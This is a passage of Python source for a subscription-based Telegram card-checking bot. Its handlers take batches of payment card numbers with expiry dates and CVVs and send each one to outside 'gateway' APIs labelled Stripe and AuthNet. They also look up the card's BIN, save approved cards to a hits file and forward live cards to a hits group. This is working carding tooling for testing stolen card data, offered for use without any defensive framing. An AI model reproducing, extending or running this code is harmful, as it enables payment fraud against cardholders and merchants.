        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        # Check credits for non-subscribed users
        if not is_user_subscribed(message.from_user.id):
            if not check_user_credits(message.from_user.id, len(cards)):
                remaining = get_remaining_credits(message.from_user.id)
                bot.reply_to(message, f"❌ Not enough credits. You need {len(cards)} credits but only have {remaining} left today. Subscribe or wait for daily reset.")
                return
            deduct_credits(message.from_user.id, len(cards))
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_sr_api_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway':'Stripe Auth 3'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")


def check_sp_api_cc(cc):
    try:
        # Normalize input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate minimum length
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe Premium Auth'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Safe YY conversion
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN info fallback
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN lookup
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted card
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # API request
        try:
            response = requests.get(
                f"https://voidxstrnpe.onrender.com/gateway=as/key=void/site=vairmerch.com/cc={formatted_cc}",
                timeout=300
            )
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                except Exception:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status normalization
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif status not in ['APPROVED', 'DECLINED']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Premium Auth'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Premium Auth'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe Premium Auth'
        }


# Handle both /chk and .chk
@bot.message_handler(commands=['sp'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sp'))

def handle_pp(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.Send Username & Chat Id of this Group Here @spydil To get approved")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /sp CC|MM|YYYY|CVV or .sp CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[5:].strip()  # remove ".chk "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe Premium Auth</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc), parse_mode='HTML')

        def check_card():
            try:
                result = check_sp_api_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


# Handle both /mchk and .mchk
@bot.message_handler(commands=['msp'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msp'))
def handle_mp(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        # Check credits for non-subscribed users
        if not is_user_subscribed(message.from_user.id):
            if not check_user_credits(message.from_user.id, len(cards)):
                remaining = get_remaining_credits(message.from_user.id)
                bot.reply_to(message, f"❌ Not enough credits. You need {len(cards)} credits but only have {remaining} left today. Subscribe or wait for daily reset.")
                return
            deduct_credits(message.from_user.id, len(cards))
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_sp_api_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway':'Stripe Premium Auth'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_at_cc(cc):
    try:
        # Normalize input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate minimum length
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'AuthNet [49$}'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Safe YY conversion
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN info fallback
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN lookup
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted card
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # API request
        try:
            response = requests.get(
                f"https://authnet-api.onrender.com/gate=auth/key=darkwaslost/cc={formatted_cc}",
                timeout=300
            )
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                except Exception:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status normalization
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif status not in ['APPROVED', 'DECLINED']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'AuthNet [49$]'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'AuthNet [49$]'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'AuthNet [49$]'
        }

@bot.message_handler(commands=['at'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.at'))
def handle_at(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from input
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /sq CC|MM|YYYY|CVV or .sq CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:
            cc = message.text[4:].strip()  

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>AuthNet [49$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>", parse_mode='HTML')

        def check_card():
            try:
                result = check_at_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send to hits group if approved
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def check_ah_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(AH_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Auth Net [5$]'
                    }
                    
                status = data.get('status', 'Declined ❌').replace('Declined ❌', 'DECLINED').replace('Declined \u274c', 'DECLINED')
                message = data.get('response', 'Your card was declined.')
                
                if 'Live' in status or 'Approved' in status:
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Auth Net [5$]'
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Auth Net [5$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Auth Net [5$]'
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Auth Net [5$]'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Auth Net [5$]'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': card,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Auth Net [5$]'
        }

# Handle both /sq and .sq
@bot.message_handler(commands=['ah'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.ah'))
def handle_ah(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from input
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /ah CC|MM|YYYY|CVV or .sq CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:
            cc = message.text[4:].strip()  # remove ".sq "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>AuthNet [5$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>", parse_mode='HTML')

        def check_card():
            try:
                result = check_ah_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send to hits group if approved
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /msq and .msq
@bot.message_handler(commands=['mah'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mah'))
def handle_mah(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_ah_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'AuthNet [5$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_sf_cc(cc):
    try:
        card = cc.replace('/', '|')
        lista = card.split("|")
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API
        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
        
        try:
            response = requests.get(SF_API_URL.format(formatted_cc), timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': card,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [10$]'
                    }
                    
                status = data.get('status', 'Declined ❌').replace('Declined ❌', 'DECLINED').replace('Declined \u274c', 'DECLINED')
                message = data.get('response', 'Your card was declined.')
                
                if 'Live' in status or 'Approved' in status:
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(card+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [10$]'
                    }
                else:
                    return {
                        'status': 'DECLINED',
                        'card': card,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [10$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': card,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Stripe [10$]'
                }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'card': card,
                'message': 'API Timeout',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe [10$]'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'card': card,
                'message': str(e),
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe [10$]'
            }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': card,
            'message': 'Invalid Input',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe [10$]'
        }

# Handle both /cc and .cc
@bot.message_handler(commands=['sf'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sf'))
def handle_sf(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
